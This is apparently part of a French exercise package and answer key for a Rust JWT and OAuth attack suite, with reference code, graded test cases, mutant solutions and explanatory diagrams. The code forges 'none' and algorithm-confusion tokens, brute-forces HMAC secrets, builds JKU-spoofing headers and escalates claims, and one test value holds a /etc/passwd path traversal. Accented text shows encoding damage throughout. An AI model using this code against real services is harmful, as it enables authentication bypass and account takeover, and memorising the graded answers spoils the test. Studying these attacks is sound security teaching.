                vuln_type: "WEAK_CLIENT_AUTH".to_string(),
                issue: format!("Weak token endpoint authentication: {}", auth),
                impact: "Client credentials may be leaked or brute-forced".to_string(),
                attack: "Intercept or brute-force client credentials".to_string(),
                cwe: "CWE-287".to_string(),
            });
        }
    }

    vulns
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MAIN FUNCTION
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

pub fn jwt_attack_suite(input_json: &str) -> String {
    // Parse input
    let input: Input = match serde_json::from_str(input_json) {
        Ok(i) => i,
        Err(e) => {
            return json!({
                "error": format!("Invalid input JSON: {}", e),
                "jwt_analysis": null,
                "oauth_vulnerabilities": []
            }).to_string();
        }
    };

    let mut output = Output {
        jwt_analysis: None,
        oauth_vulnerabilities: Vec::new(),
    };

    // Analyze JWT if provided
    if let Some(ref token) = input.jwt_token {
        match parse_jwt(token) {
            Ok((header, payload, _signature)) => {
                let mut vulnerabilities = Vec::new();

                // Detect None Algorithm
                if let Some(vuln) = detect_none_algorithm(&header) {
                    vulnerabilities.push(vuln);
                }

                // Detect Algorithm Confusion
                if let Some(vuln) = detect_algorithm_confusion(&header, &payload, &input.public_key) {
                    vulnerabilities.push(vuln);
                }

                // Detect Kid Injection
                if let Some(vuln) = detect_kid_injection(&header) {
                    vulnerabilities.push(vuln);
                }

                // Detect Expired Token
                if let Some(vuln) = detect_expired_token(&payload) {
                    vulnerabilities.push(vuln);
                }

                // Add None algorithm forged token if RS256/ES256
                let alg = header.get("alg").and_then(|a| a.as_str()).unwrap_or("");
                if alg.starts_with("RS") || alg.starts_with("ES") {
                    let forged = generate_none_token(&payload);
                    if !vulnerabilities.iter().any(|v| v.vuln_type == "NONE_ALGORITHM") {
                        vulnerabilities.push(JwtVulnerability {
                            vuln_type: "NONE_ALGORITHM_POSSIBLE".to_string(),
                            description: "Server may accept 'none' algorithm if not explicitly blocked".to_string(),
                            forged_token: Some(forged),
                            technique: "Remove signature and set alg to 'none'".to_string(),
                            cwe: "CWE-327".to_string(),
                        });
                    }
                }

                output.jwt_analysis = Some(JwtAnalysis {
                    header,
                    payload,
                    signature_valid: None, // Cannot verify without proper key handling
                    vulnerabilities,
                });
            }
            Err(e) => {
                output.jwt_analysis = Some(JwtAnalysis {
                    header: json!(null),
                    payload: json!(null),
                    signature_valid: None,
                    vulnerabilities: vec![JwtVulnerability {
                        vuln_type: "PARSE_ERROR".to_string(),
                        description: e,
                        forged_token: None,
                        technique: "N/A".to_string(),
                        cwe: "N/A".to_string(),
                    }],
                });
            }
        }
    }

    // Analyze OAuth config if provided
    if let Some(ref oauth) = input.oauth_config {
        output.oauth_vulnerabilities = analyze_oauth(oauth);
    }

    serde_json::to_string_pretty(&output).unwrap_or_else(|e| {
        json!({ "error": format!("Serialization error: {}", e) }).to_string()
    })
}
```

---

### 4.4 Solutions alternatives acceptÃ©es

#### Alternative 1 : Avec bibliothÃ¨ques crypto complÃ¨tes

```rust
// Version utilisant ring ou openssl pour la crypto rÃ©elle
// Permet une vÃ©rification de signature complÃ¨te

use ring::hmac;

fn hmac_sha256_real(key: &[u8], message: &[u8]) -> Vec<u8> {
    let key = hmac::Key::new(hmac::HMAC_SHA256, key);
    let tag = hmac::sign(&key, message);
    tag.as_ref().to_vec()
}
```

#### Alternative 2 : Approche fonctionnelle

```rust
// Style plus fonctionnel avec map/filter/fold
fn analyze_jwt_functional(token: &str, pubkey: &Option<String>) -> JwtAnalysis {
    parse_jwt(token)
        .map(|(h, p, s)| {
            let vulns = [
                detect_none_algorithm(&h),
                detect_algorithm_confusion(&h, &p, pubkey),
                detect_kid_injection(&h),
            ].into_iter()
            .flatten()
            .collect();

            JwtAnalysis { header: h, payload: p, signature_valid: None, vulnerabilities: vulns }
        })
        .unwrap_or_else(|e| /* error handling */)
}
```

---

### 4.5 Solutions refusÃ©es

#### RefusÃ©e 1 : Utilisation de jsonwebtoken crate

```rust
// âŒ REFUSÃ‰ : Ne dÃ©montre pas la comprÃ©hension des attaques
use jsonwebtoken::{decode, DecodingKey, Validation};

fn analyze_jwt_wrong(token: &str) -> JwtAnalysis {
    let decoded = decode::<Claims>(token, &key, &validation)?;
    // La librairie fait tout le travail, pas d'apprentissage
}
```
**Raison :** L'exercice vise Ã  comprendre les attaques, pas Ã  utiliser une librairie qui les prÃ©vient.

#### RefusÃ©e 2 : Pas de gestion None algorithm variations

```rust
// âŒ REFUSÃ‰ : Ne dÃ©tecte que "none" exact
fn detect_none_wrong(header: &Value) -> Option<JwtVulnerability> {
    if header["alg"] == "none" {  // Manque None, NONE, nOnE...
        // ...
    }
}
```
**Raison :** Les serveurs vulnÃ©rables acceptent souvent des variations de casse.

#### RefusÃ©e 3 : Algorithm confusion sans token forgÃ©

```rust
// âŒ REFUSÃ‰ : DÃ©tecte mais ne dÃ©montre pas l'exploitation
fn detect_alg_confusion_wrong(header: &Value) -> Option<JwtVulnerability> {
    if header["alg"].as_str()?.starts_with("RS") {
        return Some(JwtVulnerability {
            vuln_type: "ALGORITHM_CONFUSION".to_string(),
            forged_token: None,  // â† Pas de preuve d'exploitation
            // ...
        });
    }
}
```
**Raison :** Un vrai outil de sÃ©curitÃ© doit gÃ©nÃ©rer une preuve d'exploitation.

---

### 4.6 Solution bonus de rÃ©fÃ©rence

```rust
// Extension pour brute-force de secrets faibles
fn brute_force_secret(token: &str, dict: &[String]) -> Option<String> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 { return None; }

    let signing_input = format!("{}.{}", parts[0], parts[1]);
    let target_sig = base64url_decode(parts[2]).ok()?;

    for secret in dict {
        let computed_sig = hmac_sha256(secret.as_bytes(), signing_input.as_bytes());
        if computed_sig == target_sig {
            return Some(secret.clone());
        }
    }
    None
}

// Extension pour JKU spoofing
fn generate_jku_attack(payload: &Value, attacker_url: &str) -> Value {
    let malicious_header = json!({
        "alg": "RS256",
        "typ": "JWT",
        "jku": attacker_url
    });

    json!({
        "malicious_jwks": format!("{}/jwks.json", attacker_url),
        "attack_header": malicious_header,
        "instructions": "Host attacker's public key at jku URL"
    })
}

// Extension pour privilege escalation
fn escalate_privileges(payload: &Value, target_role: &str) -> Value {
    let mut escalated = payload.clone();
    if let Some(obj) = escalated.as_object_mut() {
        obj.insert("role".to_string(), json!(target_role));
        obj.insert("permissions".to_string(), json!(["*"]));
    }
    escalated
}
```

---

### 4.7 Solutions alternatives bonus

```rust
// Alternative avec parallÃ©lisation du brute-force
use rayon::prelude::*;

fn brute_force_parallel(token: &str, dict: &[String]) -> Option<String> {
    let parts: Vec<&str> = token.split('.').collect();
    let signing_input = format!("{}.{}", parts[0], parts[1]);
    let target_sig = base64url_decode(parts[2]).ok()?;

    dict.par_iter()
        .find_any(|secret| {
            let sig = hmac_sha256(secret.as_bytes(), signing_input.as_bytes());
            sig == target_sig
        })
        .cloned()
}
```

---

### 4.8 Solutions refusÃ©es bonus

```rust
// âŒ REFUSÃ‰ : Brute-force sans limite de temps
fn brute_force_infinite(token: &str) -> String {
    let mut attempt = 0u64;
    loop {  // Boucle infinie
        let secret = format!("{}", attempt);
        if verify(token, &secret) { return secret; }
        attempt += 1;
    }
}
```
**Raison :** Doit utiliser un dictionnaire fini, pas un brute-force exhaustif.

---

### 4.9 spec.json

```json
{
  "name": "jwt_attack_suite",
  "language": "rust",
  "version": "2024",
  "type": "pratique",
  "tier": 2,
  "tier_info": "MÃ©lange (JWT + OAuth 2.0 + OpenID Connect)",
  "tags": ["jwt", "oauth", "authentication", "cryptography", "phase3"],
  "passing_score": 70,

  "function": {
    "name": "jwt_attack_suite",
    "prototype": "pub fn jwt_attack_suite(input_json: &str) -> String",
    "return_type": "String",
    "parameters": [
      {"name": "input_json", "type": "&str"}
    ]
  },

  "driver": {
    "reference_file": "solutions/jwt_attack_suite_ref.rs",

    "edge_cases": [
      {
        "name": "algorithm_confusion_rs256",
        "args": ["{\"jwt_token\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIn0.sig\",\"public_key\":\"-----BEGIN PUBLIC KEY-----\\nMIIBI...\\n-----END PUBLIC KEY-----\",\"oauth_config\":null}"],
        "expected_contains": "ALGORITHM_CONFUSION",
        "is_trap": true,
        "trap_explanation": "RS256 avec clÃ© publique disponible = confusion possible"
      },
      {
        "name": "none_algorithm_lowercase",
        "args": ["{\"jwt_token\":\"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0In0.\",\"public_key\":null,\"oauth_config\":null}"],
        "expected_contains": "NONE_ALGORITHM",
        "is_trap": true,
        "trap_explanation": "alg:none doit Ãªtre dÃ©tectÃ©"
      },
      {
        "name": "none_algorithm_mixed_case",
        "args": ["{\"jwt_token\":\"eyJhbGciOiJOb05lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0In0.\",\"public_key\":null,\"oauth_config\":null}"],
        "expected_contains": "NONE_ALGORITHM",
        "is_trap": true,
        "trap_explanation": "NoNe doit aussi Ãªtre dÃ©tectÃ© (case insensitive)"
      },
      {
        "name": "kid_path_traversal",
        "args": ["{\"jwt_token\":\"eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiJ0ZXN0In0.sig\",\"public_key\":null,\"oauth_config\":null}"],
        "expected_contains": "KID_INJECTION",
        "is_trap": true,
        "trap_explanation": "kid avec ../ = path traversal"
      },
      {
        "name": "oauth_prefix_match",
        "args": ["{\"jwt_token\":null,\"public_key\":null,\"oauth_config\":{\"redirect_uri_validation\":\"prefix_match\",\"state_parameter\":true,\"pkce_required\":true,\"allowed_flows\":[\"authorization_code\"]}}"],
        "expected_contains": "OPEN_REDIRECT",
        "is_trap": true,
        "trap_explanation": "prefix_match permet legit.com.evil.com"
      },
      {
        "name": "oauth_missing_state",
        "args": ["{\"jwt_token\":null,\"public_key\":null,\"oauth_config\":{\"redirect_uri_validation\":\"strict\",\"state_parameter\":false,\"pkce_required\":true,\"allowed_flows\":[\"authorization_code\"]}}"],
        "expected_contains": "CSRF",
        "is_trap": true,
        "trap_explanation": "Pas de state = CSRF possible"
      },
      {
        "name": "oauth_implicit_flow",
        "args": ["{\"jwt_token\":null,\"public_key\":null,\"oauth_config\":{\"redirect_uri_validation\":\"strict\",\"state_parameter\":true,\"pkce_required\":false,\"allowed_flows\":[\"implicit\"]}}"],
        "expected_contains": "TOKEN_LEAKAGE",
        "is_trap": true,
        "trap_explanation": "Implicit flow expose les tokens"
      },
      {
        "name": "invalid_jwt_format",
        "args": ["{\"jwt_token\":\"not.a.valid.jwt.format.at.all\",\"public_key\":null,\"oauth_config\":null}"],
        "expected_contains": "error",
        "is_trap": false,
        "trap_explanation": "Doit gÃ©rer gracieusement les JWT invalides"
      },
      {
        "name": "null_inputs",
        "args": ["{\"jwt_token\":null,\"public_key\":null,\"oauth_config\":null}"],
        "expected_not_contains": "panic",
        "is_trap": true,
        "trap_explanation": "Tout null ne doit pas crasher"
      },
      {
        "name": "forged_token_generated",
        "args": ["{\"jwt_token\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIn0.sig\",\"public_key\":\"-----BEGIN PUBLIC KEY-----\\ntest\\n-----END PUBLIC KEY-----\",\"oauth_config\":null}"],
        "expected_contains": "forged_token",
        "is_trap": true,
        "trap_explanation": "Doit gÃ©nÃ©rer un token forgÃ© comme preuve"
      }
    ],

    "fuzzing": {
      "enabled": true,
      "iterations": 500,
      "generators": [
        {
          "type": "custom",
          "param_index": 0,
          "generator": "jwt_generator",
          "params": {
            "algorithms": ["HS256", "RS256", "ES256", "none", "None", "NONE"],
            "include_kid": true,
            "include_jku": true
          }
        }
      ]
    }
  },

  "norm": {
    "allowed_functions": ["serde_json", "base64", "hmac", "sha2"],
    "forbidden_functions": ["jsonwebtoken", "jwt-simple"],
    "check_security": true,
    "check_memory": true,
    "blocking": true
  },

  "bonus": {
    "enabled": true,
    "challenges": [
      {
        "name": "brute_force_secret",
        "description": "Brute-force faibles secrets avec dictionnaire",
        "points": 20
      },
      {
        "name": "jku_spoofing",
        "description": "GÃ©nÃ©rer attaque JKU/X5U complÃ¨te",
        "points": 15
      },
      {
        "name": "privilege_escalation",
        "description": "Modifier claims pour escalade privilÃ¨ges",
        "points": 15
      }
    ]
  }
}
```

---

### 4.10 Solutions Mutantes

#### Mutant A (Boundary) : Case-sensitive none detection

```rust
// âŒ MUTANT A : Ne dÃ©tecte que "none" exact
fn detect_none_algorithm_mutant_a(header: &Value) -> Option<JwtVulnerability> {
    let alg = header.get("alg")?.as_str()?;

    if alg == "none" {  // â† BUG: case sensitive
        return Some(JwtVulnerability {
            vuln_type: "NONE_ALGORITHM".to_string(),
            // ...
        });
    }
    None
}
// Pourquoi c'est faux : "None", "NONE", "nOnE" passent inaperÃ§us
// Ce qui Ã©tait pensÃ© : Seul "none" exact est valide
```

#### Mutant B (Safety) : Pas de validation du format JWT

```rust
// âŒ MUTANT B : Assume toujours 3 parties
fn parse_jwt_mutant_b(token: &str) -> Result<(Value, Value, String), String> {
    let parts: Vec<&str> = token.split('.').collect();

    // BUG: Pas de vÃ©rification du nombre de parties
    let header = base64url_decode(parts[0])?;  // Panic si pas assez de parties
    let payload = base64url_decode(parts[1])?;
    let signature = parts[2].to_string();

    // ...
}
// Pourquoi c'est faux : Crash sur JWT invalide ou avec 2 parties (none algo)
// Ce qui Ã©tait pensÃ© : Tous les JWT ont exactement 3 parties
```

#### Mutant C (Resource) : Accumulation mÃ©moire sur tokens longs

```rust
// âŒ MUTANT C : Clone inutile Ã  chaque itÃ©ration
fn detect_vulnerabilities_mutant_c(token: &str) -> Vec<JwtVulnerability> {
    let mut vulns = Vec::new();
    let variations = ["none", "None", "NONE", "nOnE", "NoNe"];

    for var in variations {
        let token_copy = token.to_string();  // â† BUG: clone inutile
        // ...
        vulns.push(/* ... */);
    }
    vulns
}
// Pourquoi c'est faux : 5 copies du token pour rien
// Ce qui Ã©tait pensÃ© : Chaque test a besoin de sa propre copie
```

#### Mutant D (Logic) : OAuth CSRF mal dÃ©tectÃ©

```rust
// âŒ MUTANT D : Logique inversÃ©e pour state
fn analyze_oauth_mutant_d(config: &OAuthConfig) -> Vec<OAuthVulnerability> {
    let mut vulns = Vec::new();

    if config.state_parameter == Some(true) {  // â† BUG: inversÃ©
        vulns.push(OAuthVulnerability {
            vuln_type: "CSRF".to_string(),
            // ...
        });
    }
    vulns
}
// Pourquoi c'est faux : Signale CSRF quand state EST prÃ©sent
// Ce qui Ã©tait pensÃ© : Confusion sur le sens du boolÃ©en
```

#### Mutant E (Return) : Pas de token forgÃ© pour algorithm confusion

```rust
// âŒ MUTANT E : DÃ©tecte mais ne gÃ©nÃ¨re pas de preuve
fn detect_algorithm_confusion_mutant_e(
    header: &Value,
    payload: &Value,
    public_key: &Option<String>,
) -> Option<JwtVulnerability> {
    let alg = header.get("alg")?.as_str()?;

    if alg.starts_with("RS") && public_key.is_some() {
        return Some(JwtVulnerability {
            vuln_type: "ALGORITHM_CONFUSION".to_string(),
            description: "Attack possible".to_string(),
            forged_token: None,  // â† BUG: pas de preuve
            technique: "Use public key as HMAC secret".to_string(),
            cwe: "CWE-327".to_string(),
        });
    }
    None
}
// Pourquoi c'est faux : Pas de token forgÃ© = pas de preuve d'exploitation
// Ce qui Ã©tait pensÃ© : La description suffit
```

#### Mutant F (Edge Case) : Base64URL padding incorrect

```rust
// âŒ MUTANT F : Padding base64 standard au lieu de URL-safe
fn base64url_decode_mutant_f(input: &str) -> Result<Vec<u8>, String> {
    // BUG: Ne remplace pas - et _ par + et /
    let padding = (4 - input.len() % 4) % 4;
    let padded = format!("{}{}", input, "=".repeat(padding));

    base64_decode(&padded)  // Ã‰choue sur caractÃ¨res URL-safe
}
// Pourquoi c'est faux : JWT utilise Base64URL, pas Base64 standard
// Ce qui Ã©tait pensÃ© : Base64 et Base64URL sont identiques
```

---

## ğŸ§  SECTION 5 : COMPRENDRE

### 5.1 Ce que cet exercice enseigne

1. **Structure JWT** : Header.Payload.Signature en Base64URL
2. **Attaques cryptographiques** : None algorithm, Algorithm confusion
3. **Injection de headers** : kid, jku, x5u comme vecteurs d'attaque
4. **Protocole OAuth 2.0** : Flows, vulnÃ©rabilitÃ©s, bonnes pratiques
5. **PensÃ©e adversariale** : Comment un attaquant forge des identitÃ©s

---

### 5.2 LDA â€” Traduction littÃ©rale

```
FONCTION jwt_attack_suite QUI RETOURNE UNE CHAÃNE ET PREND EN PARAMÃˆTRE input_json QUI EST UNE RÃ‰FÃ‰RENCE VERS UNE CHAÃNE
DÃ‰BUT FONCTION
    DÃ‰CLARER input COMME RÃ‰SULTAT DU PARSING JSON DE input_json
    SI input EST UNE ERREUR ALORS
        RETOURNER UN JSON D'ERREUR
    FIN SI

    DÃ‰CLARER output COMME NOUVELLE STRUCTURE OUTPUT

    SI input.jwt_token EST PRÃ‰SENT ALORS
        DÃ‰CLARER result COMME RÃ‰SULTAT DE parse_jwt(token)
        SI result EST SUCCÃˆS ALORS
            EXTRAIRE header, payload, signature DE result
            DÃ‰CLARER vulnerabilities COMME LISTE VIDE

            SI detect_none_algorithm(header) RETOURNE VULNÃ‰RABILITÃ‰ ALORS
                AJOUTER vulnÃ©rabilitÃ© Ã€ vulnerabilities
            FIN SI

            SI detect_algorithm_confusion(header, payload, public_key) RETOURNE VULNÃ‰RABILITÃ‰ ALORS
                AJOUTER vulnÃ©rabilitÃ© Ã€ vulnerabilities
            FIN SI

            SI detect_kid_injection(header) RETOURNE VULNÃ‰RABILITÃ‰ ALORS
                AJOUTER vulnÃ©rabilitÃ© Ã€ vulnerabilities
            FIN SI

            AFFECTER analysis Ã€ output.jwt_analysis
        FIN SI
    FIN SI

    SI input.oauth_config EST PRÃ‰SENT ALORS
        AFFECTER analyze_oauth(config) Ã€ output.oauth_vulnerabilities
    FIN SI

    RETOURNER output SÃ‰RIALISÃ‰ EN JSON
FIN FONCTION
```

---

### 5.2.2 Logic Flow (Structured English)

```
ALGORITHME : JWT Attack Suite
---
1. PARSER l'entrÃ©e JSON

2. SI jwt_token prÃ©sent :
   a. DÃ‰COUPER le token en 3 parties (header.payload.signature)
   b. DÃ‰CODER header et payload en Base64URL

   c. VÃ‰RIFIER None Algorithm :
      - SI alg.toLowerCase() == "none" :
          SIGNALER vulnÃ©rabilitÃ© NONE_ALGORITHM

   d. VÃ‰RIFIER Algorithm Confusion :
      - SI alg commence par "RS" ou "ES" ET public_key disponible :
          GÃ‰NÃ‰RER token HS256 signÃ© avec public_key
          SIGNALER vulnÃ©rabilitÃ© ALGORITHM_CONFUSION

   e. VÃ‰RIFIER Kid Injection :
      - SI kid contient "../" ou "http://" ou "/etc/" :
          SIGNALER vulnÃ©rabilitÃ© KID_INJECTION

3. SI oauth_config prÃ©sent :
   a. VÃ‰RIFIER redirect_uri_validation :
      - SI "prefix_match" : SIGNALER OPEN_REDIRECT
      - SI "none" : SIGNALER OPEN_REDIRECT (critique)

   b. VÃ‰RIFIER state_parameter :
      - SI false : SIGNALER CSRF

   c. VÃ‰RIFIER allowed_flows :
      - SI contient "implicit" : SIGNALER TOKEN_LEAKAGE

4. RETOURNER analyse complÃ¨te en JSON
```

---

### 5.2.3 ReprÃ©sentation Algorithmique (Logique de Garde)

```
FONCTION : detect_algorithm_confusion(header, payload, pubkey)
---
INIT vuln = None

1. EXTRAIRE alg de header :
   |
   |-- VÃ‰RIFIER si alg n'existe pas :
   |     RETOURNER None
   |
   |-- VÃ‰RIFIER si alg ne commence pas par "RS"/"ES"/"PS" :
   |     RETOURNER None (pas d'asymÃ©trique)
   |
   |-- VÃ‰RIFIER si pubkey est absente :
   |     RETOURNER None (pas d'attaque possible)

2. CONSTRUIRE token HS256 :
   |
   |-- CRÃ‰ER nouveau header avec alg="HS256"
   |-- ENCODER header en Base64URL
   |-- ENCODER payload en Base64URL
   |-- CONCATÃ‰NER header.payload
   |
   |-- SIGNER avec pubkey comme secret HMAC
   |-- ENCODER signature en Base64URL
   |
   |-- CONSTRUIRE forged_token

3. RETOURNER vulnÃ©rabilitÃ© avec forged_token
```

---

### 5.2.3.1 Diagramme Mermaid : Algorithm Confusion Attack

```mermaid
graph TD
    A[Token JWT reÃ§u] --> B{Quel algorithme ?}

    B -- "HS256" --> C[SymÃ©trique - Secret partagÃ©]
    B -- "RS256/ES256" --> D[AsymÃ©trique - ClÃ© publique/privÃ©e]
    B -- "none" --> E[âŒ Pas de signature]

    D --> F{ClÃ© publique disponible ?}
    F -- Non --> G[Pas d'attaque possible]
    F -- Oui --> H[ğŸ¯ Algorithm Confusion]

    H --> I[CrÃ©er header alg=HS256]
    I --> J[Garder mÃªme payload]
    J --> K[Signer avec PubKey comme secret HMAC]
    K --> L[Token forgÃ© valide !]

    L --> M{Serveur vÃ©rifie avec...}
    M -- "alg du token: HS256" --> N[Utilise PubKey comme secret]
    N --> O[âœ… Signature valide !]

    style H fill:#ff6b6b
    style L fill:#ff6b6b
    style O fill:#ff6b6b
```

---

### 5.3 Visualisation ASCII

#### Structure d'un JWT

```
                            JSON WEB TOKEN (JWT)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                                                                         â”‚
â”‚   eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.signature               â”‚
â”‚   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”¤           â”‚
â”‚         HEADER              PAYLOAD               SIGNATURE             â”‚
â”‚         (Base64URL)         (Base64URL)           (Base64URL)          â”‚
â”‚                                                                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                    â”‚                  â”‚                 â”‚
                    â–¼                  â–¼                 â–¼
            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚ {            â”‚  â”‚ {              â”‚  â”‚                â”‚
            â”‚  "alg":"RS256â”‚  â”‚  "sub":"user123â”‚  â”‚  HMAC_SHA256(  â”‚
            â”‚  "typ":"JWT" â”‚  â”‚  "role":"user" â”‚  â”‚    secret,     â”‚
            â”‚ }            â”‚  â”‚  "exp":170000  â”‚  â”‚    header.     â”‚
            â”‚              â”‚  â”‚ }              â”‚  â”‚    payload     â”‚
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚  )             â”‚
                                                  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### Algorithm Confusion Attack Flow

```
                          ALGORITHM CONFUSION ATTACK
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                                                                         â”‚
â”‚  Ã‰TAPE 1: Token lÃ©gitime RS256                                         â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ Header: {"alg":"RS256"}  â”‚  Payload: {"sub":"user","role":"user"}â”‚   â”‚
â”‚  â”‚ Signature: RSA_SIGN(private_key, header.payload)                 â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                         â”‚
â”‚  Ã‰TAPE 2: Attaquant rÃ©cupÃ¨re la clÃ© publique (souvent dans /jwks.json) â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ PUBLIC KEY: MIIBIjAN...                                          â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                         â”‚
â”‚  Ã‰TAPE 3: Forge token avec HS256 + public key comme secret             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ Header: {"alg":"HS256"}  â”‚  Payload: {"sub":"user","role":"ADMIN"}â”‚   â”‚
â”‚  â”‚ Signature: HMAC_SHA256(PUBLIC_KEY, header.payload)    â† LA CLÃ‰ ! â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                         â”‚
â”‚  Ã‰TAPE 4: Serveur vÃ©rifie avec l'algo du token (HS256)                 â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚ verify(token, algorithm_from_header, public_key_as_secret)       â”‚   â”‚
â”‚  â”‚                              â†“                                   â”‚   â”‚
â”‚  â”‚                         âœ… VALIDE !                              â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                         â”‚
